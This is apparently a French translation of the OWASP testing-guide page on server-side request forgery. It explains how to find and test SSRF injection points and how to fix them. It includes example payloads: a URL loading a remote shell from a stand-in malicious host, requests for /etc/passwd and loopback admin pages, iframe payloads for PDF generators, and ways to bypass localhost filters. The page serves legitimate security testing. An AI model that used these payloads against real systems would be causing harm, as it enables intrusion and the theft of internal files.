# Test de contrefaçon de requête côté serveur

|ID          |
|------------|
|WSTG-INPV-19|

## Sommaire

Les applications Web interagissent souvent avec des ressources internes ou externes. Bien que vous puissiez vous attendre à ce que seule la ressource prévue traite les données que vous envoyez, des données mal gérées peuvent créer une situation dans laquelle des attaques par injection sont possibles. Un type d'attaque par injection est appelé Server-side Request Forgery (SSRF). Une attaque SSRF réussie peut accorder à l'attaquant l'accès à des actions restreintes, des services internes ou des fichiers internes au sein de l'application ou de l'organisation. Dans certains cas, cela peut même conduire à l'exécution de code à distance (RCE).

## Objectifs des tests

- Identifier les points d'injection SSRF.
- Tester si les points d'injection sont exploitables.
- Évalue la gravité de la vulnérabilité.

## Comment tester

Lors du test de SSRF, vous essayez de faire en sorte que le serveur ciblé charge ou enregistre par inadvertance du contenu qui pourrait être malveillant. Le test le plus courant concerne l'inclusion de fichiers locaux et distants. Il existe également une autre facette de SSRF : une relation de confiance qui survient souvent lorsque le serveur d'applications est capable d'interagir avec d'autres systèmes principaux qui ne sont pas directement accessibles par les utilisateurs. Ces systèmes dorsaux ont souvent des adresses IP privées non routables ou sont limités à certains hôtes. Comme ils sont protégés par la topologie du réseau, ils manquent souvent de contrôles plus sophistiqués. Ces systèmes internes contiennent souvent des données ou des fonctionnalités sensibles.

Considérez la requête suivante :

``` http
GET https://exemple.com/page?page=about.php
```

Vous pouvez tester cette requête avec les charges utiles suivantes.

### Charger le contenu d'un fichier

```http
GET https://exemple.com/page?page=https://malicioussite.com/shell.php
```

### Accéder à une page restreinte

```http
GET https://exemple.com/page?page=http://localhost/admin
```

Ou :

```http
GET https://exemple.com/page?page=http://127.0.0.1/admin
```

Utilisez l'interface de bouclage pour accéder au contenu limité à l'hôte uniquement. Ce mécanisme implique que si vous avez accès à l'hôte, vous avez également des privilèges pour accéder directement à la page `admin`.

Ce type de relations de confiance, où les requêtes provenant de la machine locale sont traitées différemment des requêtes ordinaires, sont souvent ce qui permet à SSRF d'être une vulnérabilité critique.

### Récupérer un fichier local

```http
GET https://exemple.com/page?page=file:///etc/passwd
```

### Méthodes HTTP utilisées

Toutes les charges utiles ci-dessus peuvent s'appliquer à tout type de requête HTTP et peuvent également être injectées dans les valeurs d'en-tête et de cookie.

Une remarque importante sur SSRF avec les requêtes POST est que le SSRF peut également se manifester de manière aveugle, car l'application peut ne rien renvoyer immédiatement. Au lieu de cela, les données injectées peuvent être utilisées dans d'autres fonctionnalités telles que les rapports PDF, la gestion des factures ou des commandes, etc., qui peuvent être visibles pour les employés ou le personnel, mais pas nécessairement pour l'utilisateur final ou le testeur.

Vous pouvez en savoir plus sur Blind SSRF [ici](https://portswigger.net/web-security/ssrf/blind), ou dans la [section références](#references).

### Générateurs PDF

Dans certains cas, un serveur peut convertir les fichiers téléchargés au format PDF. Essayez d'injecter des éléments `<iframe>`, `<img>`, `<base>` ou `<script>`, ou des fonctions CSS `url()` pointant vers des services internes.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Contournement du filtre commun

Certaines applications bloquent les références à `localhost` et `127.0.0.1`. Cela peut être contourné par :

- Utilisation d'une autre représentation IP évaluée à `127.0.0.1` :
     - Notation décimale : `2130706433`
     - Notation octale : `017700000001`
     - Raccourcissement IP : `127.1`
- Obfuscation des chaînes
- Enregistrement de votre propre domaine qui se résout en `127.0.0.1`

Parfois, l'application autorise une entrée qui correspond à une certaine expression, comme un domaine. Cela peut être contourné si l'analyseur de schéma d'URL n'est pas correctement mis en œuvre, ce qui entraîne des attaques similaires aux [attaques sémantiques](https://tools.ietf.org/html/rfc3986#section-7.6).

- Utilisation du caractère `@` pour séparer les informations utilisateur de l'hôte : `https://expected-domain@attaquant-domain`
- Fragmentation d'URL avec le caractère `#` : `https://attaquant-domaine#expected-domain`
- Encodage d'URL
- Fuzzing
- Combinaisons de tout ce qui précède

Pour des charges utiles supplémentaires et des techniques de contournement, consultez la section [références](#références).

## Correction

SSRF est connu pour être l'une des attaques les plus difficiles à vaincre sans l'utilisation de listes d'autorisation nécessitant l'autorisation d'adresses IP et d'URL spécifiques. Pour en savoir plus sur la prévention SSRF, lisez la [Fiche de triche pour la prévention de la falsification des requêtes côté serveur](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## Références

- [swisskyrepo : charges utiles SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Lecture de fichiers internes à l'aide de la vulnérabilité SSRF] (https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [Cheatsheet OWASP Server Side Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger : SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger : SSRF aveugle](https://portswigger.net/web-security/ssrf/blind)
- [Webinaire Bugcrowd : SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Blog Hackerone : SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101 : SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [Syntaxe générique URI] (https://tools.ietf.org/html/rfc3986)
